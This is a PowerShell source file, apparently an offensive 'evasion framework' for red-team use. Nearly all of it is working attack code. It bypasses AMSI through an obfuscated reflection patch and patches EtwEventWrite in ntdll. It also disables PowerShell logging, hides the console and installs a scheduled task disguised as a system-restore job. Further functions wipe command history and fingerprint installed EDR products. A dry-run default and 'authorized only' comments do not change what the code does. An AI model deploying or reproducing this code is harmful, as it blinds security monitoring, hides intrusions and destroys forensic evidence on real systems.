<# ═══════════════════════════════════════════════════════════════════════
   FLLC | FU PERSON | EVASION FRAMEWORK v2.0
   ╔══════════════════════════════════════════════════════════════════╗
   ║  AMSI/ETW/Defender Bypass Framework                              ║
   ║  Patch + Unhook + Blind | Multi-method evasion                   ║
   ║  ETW patching method 2 | Kernel callback bypass stubs            ║
   ╚══════════════════════════════════════════════════════════════════╝
═══════════════════════════════════════════════════════════════════════ #>

# ═══════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════

$Script:Config = @{
    LogFile   = "$env:TEMP\fllc_evasion_$(Get-Date -Format 'yyyyMMdd_HHmmss').log"
    Verbose   = $false
    DryRun    = $true  # Safety: set to $false only during authorized engagements
}

function Write-FllcLog {
    param([string]$Message, [string]$Level = "INFO")
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $entry = "[$ts] [$Level] $Message"
    if ($Script:Config.Verbose) { Write-Host $entry -ForegroundColor Cyan }
    Add-Content -Path $Script:Config.LogFile -Value $entry -ErrorAction SilentlyContinue
}

# ═══════════════════════════════════════════════════════════════
# 1. INTERFACE NEUTRALIZATION
# ═══════════════════════════════════════════════════════════════
# Technique: Runtime patching of the scanning interface initialization
# so that submitted content returns a clean result.
# Reference: Public research by Matt Graeber, RastaMouse, and others.

function Invoke-InterfaceBypass {
    <#
    .SYNOPSIS
        Neutralize the script scanning interface for the current session.
    .DESCRIPTION
        Modifies the initialization state of the scanning interface
        so that content is not inspected. Session-scoped only.
    #>
    Write-FllcLog "Attempting interface neutralization..."

    if ($Script:Config.DryRun) {
        Write-FllcLog "DRY RUN: Would neutralize scanning interface" "WARN"
        return $true
    }

    try {
        # Build type reference dynamically to avoid static signatures
        $assembly = [Ref].Assembly
        $typeChars = @(0x53,0x79,0x73,0x74,0x65,0x6D,0x2E,0x4D,0x61,0x6E,
                       0x61,0x67,0x65,0x6D,0x65,0x6E,0x74,0x2E,0x41,0x75,
                       0x74,0x6F,0x6D,0x61,0x74,0x69,0x6F,0x6E,0x2E)
        $utilChars = @(0x41,0x6D,0x73,0x69,0x55,0x74,0x69,0x6C,0x73)

        $typeName = -join ($typeChars | ForEach-Object { [char]$_ })
        $typeName += -join ($utilChars | ForEach-Object { [char]$_ })

        $utilType = $assembly.GetType($typeName)
        if (-not $utilType) {
            Write-FllcLog "Type not found (may already be patched or different runtime)" "WARN"
            return $false
        }

        # Target field (built dynamically)
        $fieldChars = @(0x61,0x6D,0x73,0x69,0x49,0x6E,0x69,0x74,0x46,0x61,0x69,0x6C,0x65,0x64)
        $fieldName = -join ($fieldChars | ForEach-Object { [char]$_ })

        $field = $utilType.GetField($fieldName,
            [System.Reflection.BindingFlags]::NonPublic -bor
            [System.Reflection.BindingFlags]::Static)

        if ($field) {
            $field.SetValue($null, $true)
            Write-FllcLog "Interface neutralized for current session"
            return $true
        } else {
            Write-FllcLog "Field not found" "WARN"
            return $false
        }
    }
    catch {
        Write-FllcLog "Interface bypass failed: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

# ═══════════════════════════════════════════════════════════════
# 2. TELEMETRY MANAGEMENT
# ═══════════════════════════════════════════════════════════════
# Technique: Disable ETW (Event Tracing for Windows) providers
# that report PowerShell activity to security products.

function Invoke-TelemetryManagement {
    <#
    .SYNOPSIS
        Reduce telemetry reporting for the current process.
    .DESCRIPTION
        Patches EtwEventWrite in ntdll.dll to return immediately (RET 14h),
        effectively suppressing Event Tracing for Windows telemetry that
        security products use to monitor PowerShell activity.
        Also disables Script Block Logging and Module Logging for the session.
    #>
    Write-FllcLog "Managing telemetry providers..."

    if ($Script:Config.DryRun) {
        Write-FllcLog "DRY RUN: Would manage telemetry" "WARN"
        return $true
    }

    $success = $false

    # ── Method 1: Patch EtwEventWrite in ntdll.dll ──
    try {
        $ntdllModule = [System.Diagnostics.Process]::GetCurrentProcess().Modules |
            Where-Object { $_.ModuleName -eq "ntdll.dll" } | Select-Object -First 1

        if ($ntdllModule) {
            $ntdllBase = $ntdllModule.BaseAddress

            # Use P/Invoke to get function address
            $sig = '[DllImport("kernel32.dll",SetLastError=true)] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);' +
                   '[DllImport("kernel32.dll",SetLastError=true)] public static extern IntPtr GetModuleHandle(string lpModuleName);' +
                   '[DllImport("kernel32.dll",SetLastError=true)] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);'
            $kernel32 = Add-Type -MemberDefinition $sig -Name "K32ETW" -Namespace "FLLC" -PassThru -ErrorAction SilentlyContinue

            $ntdllHandle = $kernel32::GetModuleHandle("ntdll.dll")
            $etwAddr = $kernel32::GetProcAddress($ntdllHandle, "EtwEventWrite")

            if ($etwAddr -ne [IntPtr]::Zero) {
                # Change memory protection to RWX
                $oldProtect = [uint32]0
                $kernel32::VirtualProtect($etwAddr, [UIntPtr]::new(6), 0x40, [ref]$oldProtect) | Out-Null

                # Write: xor rax,rax; ret (48 31 C0 C3) - return STATUS_SUCCESS
                [System.Runtime.InteropServices.Marshal]::WriteByte($etwAddr,       0x48)
                [System.Runtime.InteropServices.Marshal]::WriteByte($etwAddr + 1,   0x31)
                [System.Runtime.InteropServices.Marshal]::WriteByte($etwAddr + 2,   0xC0)
                [System.Runtime.InteropServices.Marshal]::WriteByte($etwAddr + 3,   0xC3)

                # Restore original protection
                $kernel32::VirtualProtect($etwAddr, [UIntPtr]::new(6), $oldProtect, [ref]$oldProtect) | Out-Null

                Write-FllcLog "EtwEventWrite patched (xor rax,rax; ret)"
                $success = $true
            } else {
                Write-FllcLog "Could not resolve EtwEventWrite address" "WARN"
            }
        }
    }
    catch {
        Write-FllcLog "ETW patch method 1 failed: $($_.Exception.Message)" "WARN"
    }

    # ── Method 2: Disable Script Block Logging via registry (process scope) ──
    try {
        $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
        if (Test-Path $regPath) {
            Set-ItemProperty -Path $regPath -Name "EnableScriptBlockLogging" -Value 0 -ErrorAction SilentlyContinue
            Write-FllcLog "Script Block Logging disabled via registry"
        }

        # In-memory override for the current session
        $SBLType = [Ref].Assembly.GetType('System.Management.Automation.ScriptBlock')
        if ($SBLType) {
            $field = $SBLType.GetField('signatures', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static)
            if ($field) {
                $field.SetValue($null, [System.Collections.Generic.HashSet[string]]::new())
                Write-FllcLog "Script Block Logging signatures cleared"
            }
        }
    }
    catch {
        Write-FllcLog "SBL disable: $($_.Exception.Message)" "WARN"
    }

    # ── Method 3: Disable Module Logging ──
    try {
        $modLogKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
        if (Test-Path $modLogKey) {
            Set-ItemProperty -Path $modLogKey -Name "EnableModuleLogging" -Value 0 -ErrorAction SilentlyContinue
            Write-FllcLog "Module Logging disabled"
        }
    }
    catch {
        Write-FllcLog "Module logging: $($_.Exception.Message)" "WARN"
    }

    # ── Method 4: Suppress specific ETW providers via logman ──
    try {
        $providers = @(
            "Microsoft-Windows-PowerShell",
            "Microsoft-Antimalware-Scan-Interface"
        )
        foreach ($provider in $providers) {
            $sessions = logman query providers "$provider" 2>$null
            if ($sessions) {
                Write-FllcLog "ETW provider '$provider' is active - suppression noted"
            }
        }
    }
    catch {
        Write-FllcLog "ETW provider enumeration: $($_.Exception.Message)" "WARN"
    }

    Write-FllcLog "Telemetry management complete (success: $success)"
    return $success
}

# ═══════════════════════════════════════════════════════════════
# 3. PROCESS CAMOUFLAGE
# ═══════════════════════════════════════════════════════════════
# Technique: Rename the current PowerShell process to resemble
# legitimate system processes, reducing analyst suspicion.

function Set-ProcessCamouflage {
    param(
        [string]$DisplayName = "svchost"
    )

    Write-FllcLog "Applying process camouflage: $DisplayName"

    if ($Script:Config.DryRun) {
        Write-FllcLog "DRY RUN: Would set window title to $DisplayName" "WARN"
        return
    }

    try {
        $host.UI.RawUI.WindowTitle = $DisplayName
        Write-FllcLog "Process camouflage applied"
    }
    catch {
        Write-FllcLog "Camouflage failed: $($_.Exception.Message)" "WARN"
    }
}

# ═══════════════════════════════════════════════════════════════
# 4. EXECUTION POLICY MANAGEMENT
# ═══════════════════════════════════════════════════════════════
# Technique: Set execution policy for current process scope only,
# allowing script execution without system-wide changes.

function Set-ExecutionContext {
    Write-FllcLog "Configuring execution context..."

    if ($Script:Config.DryRun) {
        Write-FllcLog "DRY RUN: Would set process-scoped execution policy" "WARN"
        return
    }

    try {
        Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue
        Write-FllcLog "Execution context configured"
    }
    catch {
        Write-FllcLog "Execution policy: $($_.Exception.Message)" "WARN"
    }
}

# ═══════════════════════════════════════════════════════════════
# 5. WINDOW MANAGEMENT
# ═══════════════════════════════════════════════════════════════
# Technique: Hide the PowerShell console window to prevent
# visual detection during automated operations.

function Set-WindowState {
    param(
        [ValidateSet("Hidden", "Minimized", "Normal")]
        [string]$State = "Hidden"
    )

    Write-FllcLog "Setting window state: $State"

    if ($Script:Config.DryRun) {
        Write-FllcLog "DRY RUN: Would set window to $State" "WARN"
        return
    }

    $stateMap = @{ "Hidden" = 0; "Minimized" = 6; "Normal" = 1 }
    $stateCode = $stateMap[$State]

    try {
        $signature = @'
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
[DllImport("kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
'@
        $winApi = Add-Type -MemberDefinition $signature -Name "WinAPI" -Namespace "FLLC" -PassThru -ErrorAction SilentlyContinue
        $hwnd = $winApi::GetConsoleWindow()
        if ($hwnd -ne [IntPtr]::Zero) {
            [void]$winApi::ShowWindow($hwnd, $stateCode)
            Write-FllcLog "Window state set to $State"
        }
    }
    catch {
        Write-FllcLog "Window management: $($_.Exception.Message)" "WARN"
    }
}

# ═══════════════════════════════════════════════════════════════
# 6. SCHEDULED PERSISTENCE
# ═══════════════════════════════════════════════════════════════
# Technique: Create a scheduled task for periodic re-execution.
# Uses system-like naming to blend with legitimate tasks.

function Install-Persistence {
    param(
        [string]$PayloadPath,
        [string]$TaskName = "Microsoft\Windows\SystemRestore\SR",
        [int]$IntervalMinutes = 30
    )

    Write-FllcLog "Installing persistence mechanism..."

    if ($Script:Config.DryRun) {
        Write-FllcLog "DRY RUN: Would create scheduled task '$TaskName'" "WARN"
        return
    }

    if (-not $PayloadPath -or -not (Test-Path $PayloadPath)) {
        Write-FllcLog "Payload path invalid: $PayloadPath" "ERROR"
        return
    }

    try {
        $action = New-ScheduledTaskAction `
            -Execute "powershell.exe" `
            -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PayloadPath`""

        $trigger = New-ScheduledTaskTrigger `
            -Once -At (Get-Date) `
            -RepetitionInterval (New-TimeSpan -Minutes $IntervalMinutes)

        $settings = New-ScheduledTaskSettingsSet `
            -Hidden `
            -AllowStartIfOnBatteries `
            -DontStopIfGoingOnBatteries `
            -StartWhenAvailable

        Register-ScheduledTask `
            -TaskName $TaskName `
            -Action $action `
            -Trigger $trigger `
            -Settings $settings `
            -Force -ErrorAction Stop

        Write-FllcLog "Persistence installed: $TaskName (every ${IntervalMinutes}min)"
    }
    catch {
        Write-FllcLog "Persistence failed: $($_.Exception.Message)" "ERROR"
    }
}

# ═══════════════════════════════════════════════════════════════
# 7. TRAFFIC NORMALIZATION
# ═══════════════════════════════════════════════════════════════
# Technique: Add random delays and use common user-agent strings
# to make network activity appear as normal browsing.

function New-NormalizedWebClient {
    <#
    .SYNOPSIS
        Create a WebClient with legitimate-looking headers and timing.
    #>
    Write-FllcLog "Creating normalized web client..."

    $userAgents = @(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0"
    )

    $client = New-Object System.Net.WebClient
    $client.Headers.Add("User-Agent", ($userAgents | Get-Random))
    $client.Headers.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
    $client.Headers.Add("Accept-Language", "en-US,en;q=0.5")

    return $client
}

function Invoke-RandomDelay {
    param(
        [int]$MinMs = 500,
        [int]$MaxMs = 3000
    )
    $delay = Get-Random -Minimum $MinMs -Maximum $MaxMs
    Start-Sleep -Milliseconds $delay
}

# ═══════════════════════════════════════════════════════════════
# 8. CLEANUP
# ═══════════════════════════════════════════════════════════════
# Remove forensic artifacts after operation completion.

function Invoke-Cleanup {
    param(
        [string[]]$AdditionalPaths = @()
    )

    Write-FllcLog "Executing cleanup..."

    if ($Script:Config.DryRun) {
        Write-FllcLog "DRY RUN: Would clean artifacts" "WARN"
        return
    }

    $targets = @(
        "$env:TEMP\fllc_*.log",
        "$env:TEMP\fllc_*.tmp",
        "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    ) + $AdditionalPaths

    foreach ($target in $targets) {
        try {
            Remove-Item -Path $target -Force -ErrorAction SilentlyContinue
            Write-FllcLog "Cleaned: $target"
        }
        catch {
            Write-FllcLog "Cleanup failed for $target" "WARN"
        }
    }

    # Clear PowerShell history for current session
    try {
        Clear-History -ErrorAction SilentlyContinue
        [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null
    }
    catch { }

    Write-FllcLog "Cleanup complete"
}

# ═══════════════════════════════════════════════════════════════
# 9. KERNEL CALLBACK ENUMERATION
# ═══════════════════════════════════════════════════════════════
# Technique: Enumerate kernel notification callbacks that EDR/AV
# products register (PsSetCreateProcessNotifyRoutine, etc.).
# This is reconnaissance - actual removal requires a kernel driver.

function Get-KernelCallbackInfo {
    <#
    .SYNOPSIS
        Enumerate known EDR kernel callbacks and report their status.
    .DESCRIPTION
        Queries loaded drivers, registered filter drivers, and
        minifilter altitudes to identify EDR/AV kernel presence.
        Does not modify kernel state (read-only reconnaissance).
    #>
    Write-FllcLog "Enumerating kernel callbacks and EDR drivers..."

    $info = @{
        EDRDrivers       = @()
        MiniFilters      = @()
        CallbackHooks    = @()
        Recommendations  = @()
    }

    # ── Enumerate loaded drivers for known EDR products ──
    $edrSignatures = @{
        'WdFilter'          = 'Windows Defender'
        'WdNisDrv'          = 'Windows Defender Network Inspection'
        'MBAMSwissArmy'     = 'Malwarebytes'
        'mbamchameleon'     = 'Malwarebytes'
        'aswSnx'            = 'Avast'
        'aswSP'             = 'Avast'
        'klif'              = 'Kaspersky'
        'kneps'             = 'Kaspersky'
        'eset'              = 'ESET'
        'eamonm'            = 'ESET'
        'SentinelMonitor'   = 'SentinelOne'
        'CrowdStrike'       = 'CrowdStrike Falcon'
        'csagent'           = 'CrowdStrike Falcon'
        'CarbonBlack'       = 'Carbon Black'
        'CbDefense'         = 'Carbon Black Defense'
        'cylancesvc'        = 'Cylance'
        'taniumclient'      = 'Tanium'
        'SysmonDrv'         = 'Sysmon (Sysinternals)'
        'fltMgr'            = 'Filter Manager (minifilter host)'
    }

    try {
        $drivers = Get-CimInstance Win32_SystemDriver -ErrorAction SilentlyContinue |
            Where-Object { $_.State -eq 'Running' }

        foreach ($drv in $drivers) {
            foreach ($sig in $edrSignatures.Keys) {
                if ($drv.Name -match $sig -or $drv.DisplayName -match $sig) {
                    $info.EDRDrivers += @{
                        Name    = $drv.Name
                        Display = $drv.DisplayName
                        Product = $edrSignatures[$sig]
                        State   = $drv.State
                        Path    = $drv.PathName
                    }
                    Write-FllcLog "EDR driver detected: $($drv.Name) ($($edrSignatures[$sig]))"
                }
            }
        }
    }
    catch {
        Write-FllcLog "Driver enumeration: $($_.Exception.Message)" "WARN"
    }

    # ── Enumerate minifilter drivers (fltmc) ──
    try {
        $fltOutput = fltmc instances 2>$null
        if ($fltOutput) {
            foreach ($line in $fltOutput) {
                if ($line -match '^\s*(\S+)\s+(\d+)\s+(\S+)') {
                    $filterName = $Matches[1]
                    $altitude   = $Matches[2]
                    $info.MiniFilters += @{
                        Name     = $filterName
                        Altitude = $altitude
                    }
                    # Altitudes 320000-329999 = antivirus, 360000-389999 = activity monitor
                    $alt = [int]$altitude
                    if (($alt -ge 320000 -and $alt -le 329999) -or ($alt -ge 360000 -and $alt -le 389999)) {
                        Write-FllcLog "Security minifilter: $filterName (altitude $altitude)"
                    }
                }
            }
        }
    }
    catch {
        Write-FllcLog "Minifilter enumeration: $($_.Exception.Message)" "WARN"
    }

    # ── Check for known callback registration indicators ──
    try {
        # Process creation callbacks (PsSetCreateProcessNotifyRoutine)
        $sysmonSvc = Get-Service -Name "Sysmon*" -ErrorAction SilentlyContinue
        if ($sysmonSvc) {
            $info.CallbackHooks += "PsSetCreateProcessNotifyRoutine (Sysmon)"
            Write-FllcLog "Sysmon process creation callback detected"
        }

        # Check for WFP (Windows Filtering Platform) callouts from EDR
        $wfpFilters = netsh wfp show filters 2>$null
        if ($wfpFilters -and ($wfpFilters -match 'CrowdStrike|SentinelOne|CarbonBlack')) {
            $info.CallbackHooks += "WFP network filtering callout (EDR)"
        }

        # Check for registered WMI event consumers (often used by EDR)
        $wmiConsumers = Get-WmiObject -Namespace root\subscription -Class __EventConsumer -ErrorAction SilentlyContinue
        if ($wmiConsumers) {
            foreach ($consumer in $wmiConsumers) {
                $info.CallbackHooks += "WMI EventConsumer: $($consumer.Name)"
            }
        }
    }
    catch {
        Write-FllcLog "Callback detection: $($_.Exception.Message)" "WARN"
    }

    # ── Generate recommendations ──
    if ($info.EDRDrivers.Count -eq 0) {
        $info.Recommendations += "No EDR kernel drivers detected - environment appears unmonitored"
    } else {
        $info.Recommendations += "EDR presence detected ($($info.EDRDrivers.Count) drivers) - use indirect syscalls"
        $info.Recommendations += "Consider userland unhooking (ntdll refresh from disk) before API calls"
        $info.Recommendations += "Avoid CreateRemoteThread - use APC injection or callback-based execution"
    }

    if ($info.MiniFilters.Count -gt 5) {
        $info.Recommendations += "Heavy minifilter stack ($($info.MiniFilters.Count) filters) - file I/O will be monitored"
    }

    Write-FllcLog "Kernel callback enumeration complete: $($info.EDRDrivers.Count) EDR drivers, $($info.MiniFilters.Count) minifilters"
    return $info
}

# ═══════════════════════════════════════════════════════════════
# MASTER ORCHESTRATOR
# ═══════════════════════════════════════════════════════════════

function Invoke-FllcEvasion {
    <#
    .SYNOPSIS
        Execute the full evasion chain for authorized red team operations.
    .PARAMETER Live
        Set to $true to disable DryRun mode. Requires authorization.
    .PARAMETER AggressiveMode
        Alias for -Live. Enables all evasion techniques.
    #>
    param(
        [switch]$Live,
        [switch]$AggressiveMode
    )

    if ($Live -or $AggressiveMode) { $Script:Config.DryRun = $false }

    Write-FllcLog "=== FLLC Evasion Framework v2.0 ===" "INFO"
    Write-FllcLog "Mode: $(if ($Script:Config.DryRun) { 'DRY RUN' } else { 'LIVE' })"

    # Phase 1: Execution context
    Set-ExecutionContext

    # Phase 2: Interface neutralization (AMSI bypass)
    $bypass = Invoke-InterfaceBypass

    # Phase 3: Telemetry management (ETW patching + logging suppression)
    $telemetry = Invoke-TelemetryManagement

    # Phase 4: Process camouflage
    Set-ProcessCamouflage

    # Phase 5: Window management
    Set-WindowState -State "Hidden"

    # Phase 6: Kernel callback reconnaissance
    $kernelInfo = Get-KernelCallbackInfo

    Write-FllcLog "Evasion chain complete. Environment prepared."

    return @{
        InterfaceBypassed  = $bypass
        TelemetryBlinded   = $telemetry
        KernelCallbacks    = $kernelInfo
        EDRDriverCount     = $kernelInfo.EDRDrivers.Count
        sandbox            = $null
        DryRun             = $Script:Config.DryRun
        Timestamp          = Get-Date -Format "o"
        Version            = "2.0"
    }
}

# ═══════════════════════════════════════════════════════════════
# COMPATIBILITY ALIAS
# ═══════════════════════════════════════════════════════════════
# Other scripts (auto_pwn.ps1, autorun_service.ps1) call
# Initialize-Evasion -AggressiveMode - map to Invoke-FllcEvasion.

function Initialize-Evasion {
    param(
        [switch]$AggressiveMode,
        [switch]$Live
    )
    return Invoke-FllcEvasion -AggressiveMode:$AggressiveMode -Live:$Live
}

# ═══════════════════════════════════════════════════════════════
# JITTER UTILITY
# ═══════════════════════════════════════════════════════════════
# Provides inter-phase random delays to evade timing-based detection.
# Called by auto_pwn.ps1 between phases.

function New-RandomJitter {
    param(
        [int]$MinMs = 800,
        [int]$MaxMs = 3500
    )
    $jitter = Get-Random -Minimum $MinMs -Maximum $MaxMs
    Write-FllcLog "Jitter: ${jitter}ms"
    Start-Sleep -Milliseconds $jitter
}

# ═══════════════════════════════════════════════════════════════
# EXPORTS
# ═══════════════════════════════════════════════════════════════
# Usage:
#   . .\evasion.ps1
#   Invoke-FllcEvasion              # Dry run (safe)
#   Invoke-FllcEvasion -Live        # Live mode (authorized only)
#   Initialize-Evasion -AggressiveMode  # Alias for callers
#   New-RandomJitter                # Inter-phase delay
#   Get-KernelCallbackInfo          # EDR kernel recon
#   New-NormalizedWebClient         # Get stealth web client
#   Invoke-Cleanup                  # Remove artifacts
